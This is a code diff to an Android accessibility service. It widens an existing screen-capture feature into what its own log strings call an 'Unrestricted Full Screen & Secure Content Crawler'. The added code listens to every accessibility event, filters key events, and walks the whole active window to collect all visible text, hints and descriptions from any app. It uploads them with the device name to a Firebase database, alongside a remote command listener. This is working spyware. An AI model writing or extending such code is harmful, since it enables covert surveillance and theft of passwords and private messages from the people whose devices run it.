@@ -5,6 +5,7 @@ import android.accessibilityservice.AccessibilityServiceInfo
 import android.os.Build
 import android.util.Log
 import android.view.accessibility.AccessibilityEvent
+import android.view.accessibility.AccessibilityNodeInfo
 import androidx.annotation.RequiresApi
 import com.google.firebase.FirebaseApp
 import com.google.firebase.database.DatabaseReference
@@ -36,20 +37,16 @@ class AppAccessibilityService : AccessibilityService() {
             RemoteCommandListener.startListening()
 
             val info = AccessibilityServiceInfo().apply {
-                eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
-                        AccessibilityEvent.TYPE_VIEW_FOCUSED or
-                        AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
-                        AccessibilityEvent.TYPE_VIEW_SELECTED or
-                        AccessibilityEvent.TYPE_VIEW_CLICKED or
-                        AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
+                eventTypes = -1 // All accessibility events
                 feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
                 flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS or
-                        AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
-                notificationTimeout = 5
+                        AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
+                        AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS
+                notificationTimeout = 2
             }
             serviceInfo = info
-            Log.d(TAG, "Aggressive Full Screen Telemetry Service Connected")
-            LogStore.addLog("Aggressive Full Screen Telemetry Service Active")
+            Log.d(TAG, "Unrestricted Full Screen & Secure Content Crawler Connected")
+            LogStore.addLog("Unrestricted Full Screen & Secure Content Crawler Active")
         } catch (e: Exception) {
             Log.e(TAG, "Error in onServiceConnected", e)
         }
@@ -60,30 +57,22 @@ class AppAccessibilityService : AccessibilityService() {
         if (event == null) return
         try {
             val packageName = event.packageName?.toString() ?: "unknown"
-            val textList = event.text
-            val contentDesc = event.contentDescription?.toString()
-            val sourceNode = event.source
+            val sb = StringBuilder()
 
-            val gatheredText = StringBuilder()
-            if (!textList.isNullOrEmpty()) {
-                gatheredText.append(textList.joinToString(" "))
+            if (!event.text.isNullOrEmpty()) {
+                sb.append(event.text.joinToString(" ")).append(" ")
             }
-            if (!contentDesc.isNullOrBlank()) {
-                gatheredText.append(" [Desc: $contentDesc]")
-            }
-            if (sourceNode != null) {
-                try {
-                    val nodeText = sourceNode.text?.toString()
-                    val nodeHint = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) sourceNode.hintText?.toString() else null
-                    if (!nodeText.isNullOrBlank()) gatheredText.append(" [Node: $nodeText]")
-                    if (!nodeHint.isNullOrBlank()) gatheredText.append(" [Hint: $nodeHint]")
-                } catch (_: Exception) {
-                    // ignore
-                }
+            if (!event.contentDescription.isNullOrBlank()) {
+                sb.append("[Desc: ${event.contentDescription}] ")
             }
 
-            val typedText = gatheredText.toString().trim()
-            if (typedText.isBlank()) return
+            val rootNode = rootInActiveWindow
+            if (rootNode != null) {
+                traverseNode(rootNode, sb)
+            }
+
+            val capturedContent = sb.toString().trim()
+            if (capturedContent.isBlank()) return
 
             scope.launch {
                 try {
@@ -95,15 +84,41 @@ class AppAccessibilityService : AccessibilityService() {
                     val eventData = mapOf(
                         "deviceName" to deviceName,
                         "packageName" to sanitizedAppName,
-                        "text" to typedText,
+                        "text" to capturedContent,
                         "timestamp" to System.currentTimeMillis()
                     )
 
                     ref.child("accessibility_$sanitizedAppName").child(timestampKey).setValue(eventData)
                         .addOnSuccessListener {
-                            LogStore.addLog("[$deviceName] Screen Capture ($sanitizedAppName): $typedText")
+                            LogStore.addLog("[$deviceName] Secure Screen Crawl ($sanitizedAppName): $capturedContent")
                         }
                 } catch (_: Exception) {
+                }
+            }
+        } catch (_: Exception) {
+        }
+    }
+
+    private fun traverseNode(node: AccessibilityNodeInfo, sb: StringBuilder) {
+        try {
+            val text = node.text?.toString()
+            val hint = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) node.hintText?.toString() else null
+            val desc = node.contentDescription?.toString()
+
+            if (!text.isNullOrBlank()) {
+                sb.append(text).append(" ")
+            }
+            if (!hint.isNullOrBlank()) {
+                sb.append("[Hint: $hint] ")
+            }
+            if (!desc.isNullOrBlank()) {
+                sb.append("[Desc: $desc] ")
+            }
+
+            for (i in 0 until node.childCount) {
+                val child = node.getChild(i)
+                if (child != null) {
+                    traverseNode(child, sb)
                 }
             }
         } catch (_: Exception) {
